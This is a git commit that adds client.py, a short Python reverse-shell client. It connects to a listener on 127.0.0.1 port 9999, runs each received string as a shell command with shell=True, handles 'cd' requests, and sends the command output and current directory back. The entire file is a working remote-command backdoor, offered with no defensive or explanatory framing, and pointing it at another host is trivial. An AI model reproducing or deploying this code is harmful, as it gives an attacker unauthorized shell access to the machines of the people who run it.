82c39ef05745c88611f2795a8283a7780208528f
Mboya Michael <42235564+mboyamike@users.noreply.github.com>
2019-06-02 07:34:00 +0300

    Add files via upload

---
+++ client.py
@@ -0,0 +1,25 @@
+import socket
+import os
+import subprocess
+
+
+s = socket.socket()
+host = "127.0.0.1"
+port = 9999
+
+s.connect((host, port))
+
+while True:
+	data = s.recv(1024)
+	if data[:2].decode('UTF-8') == 'cd':
+		os.chdir(data[3:].decode('UTF-8'))
+
+	if len(data) > 0:
+		cmd = subprocess.Popen(data[:].decode('UTF-8'), shell=True, stdout=subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
+		output_byte = cmd.stdout.read() + cmd.stderr.read()
+		output_str = str(output_byte, 'UTF-8')
+		currentWD = os.getcwd() + '>';
+		s.send(str.encode(output_str + currentWD))
+
+		print (output_str)
+
